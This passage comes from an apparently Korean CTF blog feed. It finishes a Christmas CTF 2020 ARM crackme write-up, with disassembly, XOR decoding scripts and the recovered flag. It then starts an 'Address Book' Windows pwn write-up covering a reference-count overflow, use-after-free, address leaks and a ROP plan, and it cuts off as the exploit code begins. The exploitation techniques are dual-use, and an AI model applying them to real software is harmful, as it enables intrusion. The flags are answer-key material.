class="hljs-number">0x19</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x11</span>]result = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(string1)):    result += chr(string1[i] ^ string2[i % len(string2)])print(result)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre><p><code>sub_9fc</code>까지 마쳤으니 다시 main으로 돌아가죠!</p><pre><code class="hljs c"><span class="hljs-comment">// main</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">char</span> *var1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x13</span>, <span class="hljs-number">1</span>);    <span class="hljs-keyword">int</span> var2 = sub_9b0(sub_ab8());    sub_96c();    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, var1);    sub_b30(var1, var2);    <span class="hljs-built_in">free</span>(var1);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>이제 입력 값을 받아서 <code>sub_b30</code>하는 것만 남았네요. <code>sub_b30</code> 함수를 확인해봅시다.</p><pre><code class="hljs apache"><span class="hljs-attribute">0000000000000b30</span> &lt;sub_b<span class="hljs-number">30</span>&gt;: <span class="hljs-attribute">b30</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-32]!</span><span class="hljs-meta"> b34:   910003fd    mov x29, sp</span><span class="hljs-meta"> b38:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">b3c</span>:   f<span class="hljs-number">9000</span>be<span class="hljs-number">1</span>    str x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b40</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b44</span>:   <span class="hljs-number">91001800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">6</span> <span class="hljs-attribute">b48</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b4c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b50</span>:   <span class="hljs-number">91003800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xe <span class="hljs-attribute">b54</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b58</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b5c</span>:   <span class="hljs-number">54000761</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">b60</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b64</span>:   <span class="hljs-number">91001000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">4</span> <span class="hljs-attribute">b68</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b6c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b70</span>:   <span class="hljs-number">91000</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">3</span> <span class="hljs-attribute">b74</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b78</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b7c</span>:   <span class="hljs-number">54000661</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">b80</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b84</span>:   <span class="hljs-number">91000</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">3</span> <span class="hljs-attribute">b88</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b8c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b90</span>:   <span class="hljs-number">91002800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xa <span class="hljs-attribute">b94</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b98</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b9c</span>:   <span class="hljs-number">54000561</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">ba0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">ba4</span>:   <span class="hljs-number">91001</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">7</span> <span class="hljs-attribute">ba8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bac</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bb0</span>:   <span class="hljs-number">91004400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">11</span> <span class="hljs-attribute">bb4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bb8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bbc</span>:   <span class="hljs-number">54000461</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">bc0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">bc4</span>:   <span class="hljs-number">91000400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">bc8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bcc</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bd0</span>:   <span class="hljs-number">91003800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xe <span class="hljs-attribute">bd4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bd8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bdc</span>:   <span class="hljs-number">54000361</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">be0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">be4</span>:   <span class="hljs-number">91001400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">5</span> <span class="hljs-attribute">be8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bec</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bf0</span>:   <span class="hljs-number">9100</span>d<span class="hljs-number">000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">34</span> <span class="hljs-attribute">bf4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bf8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bfc</span>:   <span class="hljs-number">54000261</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">c00</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c04</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c08</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">c0c</span>:   <span class="hljs-number">9100</span>d<span class="hljs-number">400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">35</span> <span class="hljs-attribute">c10</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c14</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">c18</span>:   <span class="hljs-number">54000181</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">c1c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c20</span>:   <span class="hljs-number">91000800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">2</span> <span class="hljs-attribute">c24</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c28</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">c2c</span>:   <span class="hljs-number">91000800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">2</span> <span class="hljs-attribute">c30</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c34</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">c38</span>:   <span class="hljs-number">54000081</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">c3c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c40</span>:   <span class="hljs-number">97</span>ffffab    bl  aec &lt;sub_aec&gt; <span class="hljs-attribute">c44</span>:   d<span class="hljs-number">503201</span>f    nop <span class="hljs-attribute">c48</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">27</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #32</span><span class="hljs-meta"> c4c:   d65f03c0    ret</span></code></pre><p>위에서 복호화한 <code>[a-zA-Z0-9]</code> 값과 입력 값을 통해 하나씩 비교한 후 조건이 모두 맞으면 <code>x0</code>에  input 값을 넣고 <code>sub_aec</code>를 호출합니다. 값을 비교하는 부분을 간단하게 정리하면 아래와 같습니다.</p><ul><li>var1[0x6] == var2[0xe]</li><li>var1[0x4] == var2[0x3]</li><li>var1[0x3] == var2[0xa]</li><li>var1[0x7] == var2[0x11]</li><li>var1[0x1] == var2[0xe]</li><li>var1[0x5] == var2[0x34]</li><li>var1[0x0] == var2[0x35]</li><li>var1[0x2] == var2[0x2]</li></ul><p>순서에 맞춰서 배열하면 input 값을 구할 수 있습니다.</p><pre><code class="hljs python">user_input = <span class="hljs-string">&quot;&quot;</span>user_input += result[<span class="hljs-number">0x35</span>] + result[<span class="hljs-number">0xe</span>] + result[<span class="hljs-number">0x2</span>] + result[<span class="hljs-number">0xa</span>] + result[<span class="hljs-number">0x3</span>] +result[<span class="hljs-number">0x34</span>] + result[<span class="hljs-number">0xe</span>] + result[<span class="hljs-number">0x11</span>]print(user_input)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">1ockd0or</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre><p>조건이 맞는 입력 값을 인자로 <code>sub_aec</code> 값을 호출하니 해당 함수를 확인해보면 아래와 같습니다.</p><pre><code class="hljs apache"><span class="hljs-attribute">value2</span>  DCB <span class="hljs-number">0</span>x<span class="hljs-number">69</span>, <span class="hljs-number">0</span>x<span class="hljs-number">22</span>, <span class="hljs-number">0</span>x<span class="hljs-number">22</span>, <span class="hljs-number">0</span>x<span class="hljs-number">38</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">43</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">45</span>, <span class="hljs-number">0</span>xE, <span class="hljs-number">0</span>x<span class="hljs-number">3</span>C,<span class="hljs-attribute">0x8</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">30</span>, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">3</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">44</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>,<span class="hljs-attribute">0x6E</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">53</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>x<span class="hljs-number">12</span><span class="hljs-attribute">0000000000000aec</span> &lt;sub_aec&gt;: <span class="hljs-attribute">aec</span>:   a<span class="hljs-number">9</span>bd<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-48]!</span><span class="hljs-meta"> af0:   910003fd    mov x29, sp</span><span class="hljs-meta"> af4:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">af8</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">afc</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">29</span>    bl  <span class="hljs-number">7</span>a<span class="hljs-number">0</span> &lt;strlen@plt&gt; <span class="hljs-attribute">b00</span>:   <span class="hljs-number">2</span>a<span class="hljs-number">0003</span>e<span class="hljs-number">3</span>    mov w<span class="hljs-number">3</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b04</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">2</span>    ldr x<span class="hljs-number">2</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b08</span>:   <span class="hljs-number">528003</span>e<span class="hljs-number">1</span>    mov w<span class="hljs-number">1</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span>f                   // #<span class="hljs-number">31</span> <span class="hljs-attribute">b0c</span>:   <span class="hljs-number">90000000</span>    adrp    x<span class="hljs-number">0</span>, value<span class="hljs-number">2</span>@page <span class="hljs-attribute">b10</span>:   <span class="hljs-number">91382000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, value<span class="hljs-number">2</span>@pageoff <span class="hljs-attribute">b14</span>:   <span class="hljs-number">97</span>ffffba    bl  <span class="hljs-number">9</span>fc &lt;sub_<span class="hljs-number">9</span>fc&gt; <span class="hljs-attribute">b18</span>:   f<span class="hljs-number">90017</span>e<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">b1c</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">b20</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">3</span>c    bl  <span class="hljs-number">810</span> &lt;puts@plt&gt; <span class="hljs-attribute">b24</span>:   d<span class="hljs-number">503201</span>f    nop <span class="hljs-attribute">b28</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">37</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #48</span><span class="hljs-meta"> b2c:   d65f03c0    ret</span></code></pre><p>입력 값과 value2를 인자로 <code>sub_9fc</code>를 수행하는 것을 확인할 수 있습니다. <code>sub_9fc</code>의 경우 아까 python script를 짜 놓았기 때문에 그냥 값을 입력하여 연산하면 됩니다.</p><pre><code class="hljs python">string3 = [    <span class="hljs-number">0x69</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xE</span>, <span class="hljs-number">0x3C</span>,<span class="hljs-number">0x8</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x17</span>,<span class="hljs-number">0x6E</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x12</span>]flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(string3)):    flag += chr(string3[i] ^ ord(user_input[i % len(user_input)]))print(flag)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">1ockd0or</span><span class="hljs-string">XMAS&#123;s4nta_can_enter_the_h0use&#125;</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre><p>FLAG : XMAS{s4nta_can_enter_the_h0use}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>christmas ctf 2020</tag>
      
      <tag>arm</tag>
      
      <tag>crackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - Address Book</title>
    <link href="/2020/12/29/l0ch/address_book/"/>
    <url>/2020/12/29/l0ch/address_book/</url>
    
    <content type="html"><![CDATA[<p>처음으로 낸 Windows 환경의 문제입니다..! 대회 당일날 시작과 동시에 공개된 문제이나 12시간이 되도록 솔버가 안나와서 solvable한 문제가 아닌가 대회 내내 걱정했던 친구이기도 하죠 ㅠㅠ</p><p>idioth형이 대회 중간에 0솔버를 위한 선물이라고 짤을 하나 보내줬는데…</p><p><img src="/2020/12/29/l0ch/address_book/1.png"></p><blockquote><p>즌쯔… 느므 그믑느…^^</p></blockquote><p>그래도 대회 12시간만에 다행히 솔버가 나와서 다행이라고 생각합니다 ㅎㅎ.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>먼저, 문제 환경부터 보시죠</p><blockquote><p>Windows 64bit Version 10.0.19041.264 ASLR: True DEP: True SafeSEH: True Stack Cookie: True</p></blockquote><p>64bit 윈도우 10 환경이며, 보호기법은 모두 걸려있네요!</p><p>어떤 기능들이 있는지 보겠습니다.</p><p><img src="/2020/12/29/l0ch/address_book/2.png"></p><ol><li><p>Add address Info</p><p>name, address, city를 입력받고 address info를 추가</p></li><li><p>Address Info List</p><p>추가한 address info들을 출력</p></li><li><p>Delete address Info</p><p>address info를 삭제. 이 때 삭제된 info는 Recycle Bin List에 추가</p></li><li><p>Restore address Info</p><p>삭제된 info를 원래 List로 복구</p></li><li><p>Modify address Info</p><p>수정할 address info를 선택해 name, address, city를 수정 가능</p></li><li><p>Empty List</p><p>address list와 recycle bin list 항목을 모두 삭제</p></li><li><p>Exit</p></li></ol><p>7번으로 종료하면</p><p><img src="/2020/12/29/l0ch/address_book/3.png"></p><p>list가 저장되었다고 뜨는데, 옆에 메모리 주소로 보이는 값이 존재합니다.</p><p>리스트는 double linked list로 구현되어 있으며 처음에 <code>Address Book</code>, <code>Recycle Bin</code> 두개의 객체가 할당되어 각각 2byte 정수 type의 reference count (초기값=10)를 가집니다. 함수가 객체를 참조할 때 count가 10 올라가며 해당 함수를 빠져나올때 count가 10 감소하고 10보다 작으면 할당된 객체를 free하고 객체의 주소를 출력합니다.</p><p>감이 오시죠. C++의 공유포인터 <code>std::shared_ptr</code> 를 커스텀 구현한 문제입니다.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><code>Recycle Bin</code>의 info를 restore할때 복구하는 노드에서, <code>Recycle Bin</code>에서 사용한 next 값이 초기화되지 않고 남아있습니다.</p><p><img src="/2020/12/29/l0ch/address_book/4.png"><br>노드를 네 개 생성한 뒤 4, 3을 차례대로 삭제하면 Recycle Bin 리스트에 순서대로 들어갑니다.</p><p><img src="/2020/12/29/l0ch/address_book/5.png"></p><p>Restore 4로 <code>Address List</code>로 복구했을때 node 4의 next 가 초기화되지 않고 여전히 <code>Recycle Bin</code>의 3을 가리킵니다.</p><p><img src="/2020/12/29/l0ch/address_book/6.png"></p><p>Restore 3을 하면 <code>Address List</code>에 index 순서에 맞게 2와 4 사이에 삽입되고 결과적으로 다음과 같이 3과 4의 next가 각각 서로를 가리키게 되어 순환적인 구조를 가진 리스트를 만들 수 있습니다.</p><p><code>Address List</code>의 노드들을 출력하는 함수는 노드의 next가 NULL일때까지 혹은 입력한 수만큼 재귀호출을 통해 head 노드부터 출력합니다. 이때 입력한 수를 검증하지 않아 reference counter의  integer overflow가 발생할 수 있습니다.</p><p><img src="/2020/12/29/l0ch/address_book/7.png"><br>재귀함수의 인자로 <code>Address List</code>의 포인터가 들어가는데, 재귀함수가 한 번 호출될때마다 <code>Address List</code>의 reference count가 10씩 증가합니다. </p><p>위와 같이 취약점을 트리거했을 때 정확히 3275만큼 재귀로 참조하면 2byte 정수 조건을 벗어나게 되어 free 조건인 <code>reference count &lt; 10</code> 을 만족하게 되고 AddressBook 포인터가 한 번 free됩니다.  </p><p>이어 Add Address Info에서 노드를 새로 할당하는 것으로 UAF를 트리거할 수 있어 Address Info에서 <code>name</code> 으로 vtable 을 overwrite 해 eip control이 가능합니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>바이너리에서 <code>flag.txt</code>를 open했으니 <code>read</code>와 <code>write</code>로 flag 내용을 출력하기만 하면 됩니다.</p><pre><code class="hljs c">read(<span class="hljs-number">3</span>, buffer, <span class="hljs-keyword">sizeof</span>(flag))  <span class="hljs-comment">// 3 : file descriptor</span>write(<span class="hljs-number">1</span>, buffer, <span class="hljs-keyword">sizeof</span>(flag))</code></pre><p>ROP에 필요한 건 다음과 같습니다.</p><p><code>ntdll.dll</code> base address → gadget</p><p><code>ucrtbase.dll</code> base address → <code>read</code>, <code>write</code></p><p>위 주소들을 구하기 위해서 먼저 바이너리의 imagebase부터 leak해야 합니다.</p><p>UAF 이후 leak은 Address Info를 출력할 때 <code>head</code> 포인터 값에서부터 참조하는 것을 이용해 Address Info의 <code>city+16</code> 에서 <code>head</code> 포인터를 overwrite → OOB read가 가능한 점을 이용합니다.</p><p><img src="/2020/12/29/l0ch/address_book/8.png"></p><p>몇번 실행해보면 객체간 offset 에 패턴이 있습니다. offset을 계산해서 city+16 에 Recycle Bin의 주소로 head 를 overwrite하고 2번 메뉴로 출력하면 vtable 주소를 구할 수 있습니다.</p><p><img src="/2020/12/29/l0ch/address_book/9.png"></p><p><code>Recycle Bin</code>의 vtable offset은 0x6960이니 leak한 vtable에 offset만큼 빼면 imagebase가 나오겠군요!</p><p>이제 imagebase를 구했으니 dll 주소를 구하는건 쉽습니다!</p><p>구하고싶은 dll의 아무 함수나 IAT 테이블에서 offset을 찾고, imagebase+offset 주소에 존재하는 dll 함수 주소를 leak하면 되죠. <code>ntdll</code>부터 구해보겠습니다.</p><p><img src="/2020/12/29/l0ch/address_book/10.png"></p><p><code>!dh imagebase</code> 로 IAT offset을 찾고 Import된 dll 함수를 찾아볼게요</p><p><img src="/2020/12/29/l0ch/address_book/11.png"></p><p><code>ntdll!RtlInitializeSListHead</code> 가 imagebase+ 0x6060에 있네요.</p><p><code>ucrtbase!free</code> 도 imagebase + 0x61f0 인걸 확인할 수 있습니다.</p><p>vtable을 leak했을 때와 같은 방법으로 <code>head</code>를 overwrite해 해당 메모리에 있는 값을 출력하고 각각 dll 내 offset을 빼주면 dll base address를 구할 수 있습니다!</p><h2 id="imagebase-dll-leak"><a href="#imagebase-dll-leak" class="headerlink" title="imagebase/dll leak"></a>imagebase/dll leak</h2><pre><code class="hljs python"><span class="hljs-comment"># 전체 코드는 아래 Exploit Code 참조</span><span class="hljs-comment"># get heap address</span>p.recvuntil(<span 